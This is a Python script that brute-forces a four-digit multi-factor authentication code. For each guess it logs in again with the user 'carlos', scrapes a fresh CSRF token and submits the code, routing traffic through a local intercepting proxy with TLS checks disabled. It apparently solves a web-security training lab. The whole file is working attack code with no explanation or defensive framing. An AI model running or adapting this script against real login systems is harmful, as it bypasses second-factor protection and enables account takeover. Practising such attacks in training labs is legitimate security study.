import sys
import requests
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def new_session(url1, proxies):
    res = requests.get(url1, verify=False)
    soup = BeautifulSoup(res.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"}).get("value")
    cookies = {
        'session': res.cookies.get('session')
    }
    data = {
        'username':'carlos',
        'password':'montoya',
        'csrf': csrf_token
    }
    r = requests.post(url1, data=data, allow_redirects=False, cookies=cookies, proxies=proxies, verify=False)
    session = r.cookies.get('session')
    return session

def new_csrf(url2, proxies, session_cookie):
    cookies = {
        'session': session_cookie
    }
    r = requests.get(url2, proxies=proxies, cookies=cookies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_value = soup.find('input', {'name': 'csrf'})['value']
    return csrf_value

def brute_forcer(url1, url2, proxies):
    for i in range(0, 10000):
        code = str(i).zfill(4)
        sys.stdout.write('\r'+ 'Trying: ' +code)
        sys.stdout.flush()

        session_cookie = new_session(url1, proxies)
        csrf = new_csrf(url2, proxies, session_cookie)
        data = {
            'csrf': csrf,
            'mfa-code':code
        }
        cookies = {
            'session': session_cookie
        }
        r = requests.post(url2, data=data, proxies=proxies, cookies=cookies, verify=False)
        if r.status_code != 200:
            print(f'Found Code {code}' + '\n')
            print(r.status_code)
            break
        

def main():
    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: python3 {sys.argv[0]} www.example.com")

    url = sys.argv[1]
    url2 = url+'/login2'
    url1 = url+'/login'
    print("[+] Starting brute-force")
    brute_forcer(url1, url2, proxies)

if __name__ == "__main__":
    main()